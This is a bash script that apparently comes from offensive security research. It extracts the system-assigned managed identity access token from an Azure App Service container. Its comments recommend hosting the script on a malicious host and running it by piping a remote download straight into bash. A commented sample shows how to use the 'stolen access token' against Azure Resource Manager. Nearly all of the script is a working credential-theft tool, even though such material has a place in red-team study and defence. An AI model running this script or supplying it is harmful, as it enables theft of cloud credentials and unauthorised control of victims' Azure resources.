#!/bin/bash
# Use this script to get access token of Azure App Service's system-assigned managed identity
# You must have Website Contributor to https://<your_app_name>.scm.azurewebsites.net/webssh/host
# This script can be hosted in a controled malicious host and execute directly from that as living off the land technique
# wget -qO- https://<storage_account_name>.blob.core.windows.net/scripts/hello.sh | dos2unix | bash (LoTL)

echo -e "\e[32m[+] Start scanning identity on the target App Service\e[0m"

# The file that store environment variables including identity_endpoint and identity_header
# You can use printenv to print those variables. However Microsoft may block the command in the future
profile_path=/etc/profile

if [ -f "${profile_path}" ]; then 
  echo -e "\e[32m[+]${profile_path} exists\e[0m" 
else 
  echo -e "\e[31m[!]${profile_path} doesn't exist\e[0m" 
  exit 
fi

# Grep and get target variables's value
identity_endpoint_var=$(grep "IDENTITY_ENDPOINT" ${profile_path} )
identity_header_var=$(grep "IDENTITY_HEADER" ${profile_path} )
identity_endpoint=${identity_endpoint_var#*=}
identity_header=${identity_header_var#*=}

if [ -z "${identity_endpoint_var}" -o -z "${identity_header_var}" ]; then
  echo -e "\e[31m[!] Identity endpoint or identity header variables couldn't be found\e[0m"
  exit
else
  echo -e "\e[32m[+] Found target variables!\e[0m"
fi

# This script uses management.azure.com as the target resource endpoint. 
uri="${identity_endpoint}?resource=https://management.azure.com&api-version=2019-08-01"
header="X-IDENTITY-HEADER:${identity_header}"

# Remove double quotes on string
header_=$(echo ${header} | tr -d '"')

# The managed Docker container to provide remote SSH on your web app Alpine Linux v3.13
# The following wget is used to print the response which contains Access Token.
# You need to re-format the access token as the output in the terminal prints access token in multiple lines
wget -qO- --header ${header_} ${uri}

echo -e  "\e[32m[+] Copy the access token and use it separately on your workstation\e[0m"
# Below is the sample CURL to get VM information. Change the endpoint e.g Key Vault if you would like to test
# Reference: https://azsec.azurewebsites.net/2019/12/20/a-few-ways-to-acquire-azure-access-token-with-scripting-languages/

#### SAMPLE SCRIPT TO USE WITH STOLEN ACCESS TOKEN ####
## AUTH_HEADER="Authorization: Bearer $ACCESS_TOKEN"
## CONTENT_TYPE="Content-Type: application/json"
## SUBSCRIPTION_ID="67d6179d-a99d-4ccd-8c56-XXXXXXXXX"
## RG_NAME='off-rg'
## RM_ENDPOINT='https://management.azure.com'
## URI="$RM_ENDPOINT/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RG_NAME?api-version=2021-04-01"
## curl -X GET -H "$AUTH_HEADER" -H "$CONTENT_TYPE" $URI
######################################################